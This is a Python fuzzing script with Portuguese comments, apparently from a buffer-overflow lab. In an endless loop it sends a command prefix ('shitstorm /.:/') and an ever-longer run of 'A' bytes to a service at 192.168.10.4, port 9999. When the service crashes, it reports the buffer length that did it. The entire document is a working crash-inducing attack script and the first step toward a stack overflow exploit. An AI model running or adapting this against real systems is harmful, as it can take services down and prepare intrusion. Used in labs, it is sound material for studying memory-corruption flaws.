#!/usr/bin/python3

import sys  # Importa o módulo sys para acessar funcionalidades do sistema
import socket  # Importa o módulo socket para comunicação em rede
from time import sleep  # Importa a função sleep do módulo time para pausar a execução

# Define um buffer inicial de bytes para envio
buffer = b"A" * 100

# Loop infinito para continuar o fuzzing
while True:
    try:
        # Cria um novo socket IPv4 usando TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Conecta-se a um servidor remoto na porta 9999
        sock.connect(('192.168.10.4', 9999))
        
        # Constrói o payload a ser enviado, incluindo o buffer
        payload = b'shitstorm /.:/' + buffer
        
        # Envia o payload através do socket
        sock.send(payload)
        
        # Fecha o socket
        sock.close()
        
        # Aguarda por 1 segundo antes de continuar o loop
        sleep(1)
        
        # Aumenta o tamanho do buffer para aumentar o fuzzing
        buffer += b"A" * 100
        
    except:
        # Se ocorrer uma exceção, imprime a mensagem de crash do fuzzing e sai do programa
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
        sys.exit()
